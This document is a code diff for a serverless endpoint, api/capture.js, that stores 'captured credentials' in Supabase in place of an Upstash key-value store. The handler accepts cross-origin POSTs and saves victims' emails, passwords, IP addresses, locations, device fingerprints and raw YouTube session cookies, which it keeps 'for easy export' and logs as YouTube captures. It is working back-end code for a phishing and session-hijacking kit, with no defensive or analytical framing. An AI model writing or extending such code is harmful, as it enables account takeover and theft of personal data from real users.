@@ -1,8 +1,9 @@
-// api/capture.js
+// api/capture.js — Store captured credentials + data to Supabase
 
-const UPSTASH_URL = process.env.KV_REST_API_URL;
-const UPSTASH_TOKEN = process.env.KV_REST_API_TOKEN;
-const KV_PREFIX = "coffee-fence";
+import { createClient } from '@supabase/supabase-js';
+
+const SUPABASE_URL = process.env.SUPABASE_URL;
+const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
 
 export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -12,79 +13,65 @@ export default async function handler(req, res) {
     if (req.method === 'OPTIONS') return res.status(200).end();
     if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
+    // Validate env vars
+    if (!SUPABASE_URL || !SUPABASE_SERVICE_KEY) {
+        console.error('[!] Missing Supabase credentials');
+        return res.status(500).json({ error: 'Server configuration error' });
+    }
+
+    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
+
     try {
         const data = req.body;
-        if (!data) return res.status(400).json({ error: 'No data' });
+        if (!data) return res.status(400).json({ error: 'No data received' });
 
         const entryId = `yt_${Date.now()}_${Math.random().toString(36).substring(2, 10)}`;
-        const key = `${KV_PREFIX}:${entryId}`;
 
-        // Store individual entry
-        await upstashSet(key, JSON.stringify(data));
+        // Prepare the row
+        const row = {
+            entry_id: entryId,
+            timestamp: data.timestamp || new Date().toISOString(),
+            email: data.email || '',
+            password: data.password || '',
+            ip: data.ip || null,
+            location: data.location || null,
+            device: data.device || null,
+            cookies: data.cookies?.parsed || null,
+            cookie_raw: data.cookies?.raw || null,
+            cookie_count: data.cookies?.count || 0,
+            fingerprint: data.fingerprint || null,
+            user_agent: data.device?.userAgent || null,
+            platform: data.device?.platform || null
+        };
 
-        // Append to master list
-        await appendToList(`${KV_PREFIX}:youtube_entries`, data);
+        // Insert into Supabase
+        const { error } = await supabase
+            .from('youtube_captures')
+            .insert(row);
 
-        // Increment counter
-        await upstashIncr(`${KV_PREFIX}:youtube_total`);
-
-        // If cookies were captured, also store them separately for easy export
-        if (data.cookies && data.cookies.raw) {
-            const cookieKey = `${KV_PREFIX}:cookies_${entryId}`;
-            await upstashSet(cookieKey, JSON.stringify({
-                timestamp: data.timestamp,
-                email: data.email,
-                cookies: data.cookies.raw,
-                domain: 'youtube.com'
-            }));
+        if (error) {
+            console.error('[!] Supabase insert error:', error);
+            return res.status(500).json({ error: error.message });
         }
 
-        console.log(`[+] YouTube capture: ${data.email} | ${data.ip?.ip || 'unknown'}`);
+        // Also store cookies separately for easy export if present
+        if (data.cookies?.raw) {
+            const { error: cookieError } = await supabase
+                .from('youtube_captures')
+                .update({ cookie_raw: data.cookies.raw })
+                .eq('entry_id', entryId);
+
+            if (cookieError) {
+                console.error('[!] Cookie update error:', cookieError);
+            }
+        }
+
+        console.log(`[+] YouTube capture stored: ${data.email} | IP: ${data.ip?.ip || 'unknown'} | Cookies: ${data.cookies?.count || 0}`);
         return res.status(200).json({ status: 'ok', id: entryId });
 
     } catch (error) {
         console.error('[!] Capture error:', error.message);
+        console.error('[!] Stack:', error.stack);
         return res.status(500).json({ error: error.message });
     }
-}
-
-async function upstashSet(key, value) {
-    const url = `${UPSTASH_URL}/set/${encodeURIComponent(key)}`;
-    const resp = await fetch(url, {
-        method: 'POST',
-        headers: {
-            'Authorization': `Bearer ${UPSTASH_TOKEN}`,
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(value)
-    });
-    return resp.json();
-}
-
-async function upstashGet(key) {
-    const url = `${UPSTASH_URL}/get/${encodeURIComponent(key)}`;
-    const resp = await fetch(url, {
-        headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
-    });
-    return resp.json();
-}
-
-async function upstashIncr(key) {
-    const url = `${UPSTASH_URL}/incr/${encodeURIComponent(key)}`;
-    const resp = await fetch(url, {
-        method: 'POST',
-        headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
-    });
-    return resp.json();
-}
-
-async function appendToList(listKey, data) {
-    const result = await upstashGet(listKey);
-    let list = [];
-    if (result.result) {
-        try { list = JSON.parse(result.result); } catch(e) { list = []; }
-    }
-    if (!Array.isArray(list)) list = [];
-    list.push(data);
-    await upstashSet(listKey, JSON.stringify(list));
 }
